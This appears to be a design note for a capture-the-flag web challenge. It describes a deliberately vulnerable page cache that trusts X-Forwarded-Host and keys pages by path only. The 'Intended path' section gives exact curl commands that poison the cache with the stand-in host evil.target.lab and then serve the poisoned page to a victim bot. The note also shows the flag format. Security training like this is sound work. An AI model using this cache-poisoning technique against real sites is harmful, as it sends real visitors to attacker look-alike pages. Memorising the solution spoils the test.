# http/host-cache-poison — HostCachePoison (location-locked, critical, CUT CANDIDATE)

**FreshEdge CDN** marketing home (`/home`) with an in-app full-page cache.
**Bug (two cooperating mistakes, one class — host-header poisoning → cache poisoning):**
1. `/home` renders all absolute links from the request's **effective host** — `X-Forwarded-Host` is trusted first ("we're behind a proxy").
2. The page cache is keyed by **path only** — the rendered host is *not* part of the key. One request with `X-Forwarded-Host: evil.target.lab` caches a page whose links point into attacker space (catch-all `*.target.lab`), and every later visitor of `/home` is served the poisoned copy.

**Gate:** `/flag` only after the poisoned `/home` was actually **served to the innocent victim** (server-side state — set when the innocent's session is served a poisoned cached page).

## Intended path
1. Poison the cache: `curl -H "X-Forwarded-Host: evil.target.lab:8119" http://victim.target.lab:8119/home` (response header `X-Cache: MISS`; every absolute link now points to `evil.target.lab`).
2. Confirm: `curl http://victim.target.lab:8119/home` → `X-Cache: HIT (poisoned)` with attacker-space links; `curl http://victim.target.lab:8119/cache-state` shows `poisoned: 1`.
3. Serve it to the victim: `POST http://collector.target.lab:8119/victim` with `{"url":"http://victim.target.lab:8119/home"}` — the bot fetches `/home` with the innocent's session and receives the poisoned page (visible in the bot's `excerpt`).
4. `curl http://victim.target.lab:8119/flag` — gate: server-side proof that the poisoned page was served to the innocent.

Real-world impact (README narrative): the innocent would click `Continue to your dashboard` on the poisoned page and land on the attacker's look-alike at `evil.target.lab` (every hit is recorded at `/leaks`).

**Flag:** `DSLTV{HTTP-HostCachePoison-<9 digits>}` (only from `/flag`).
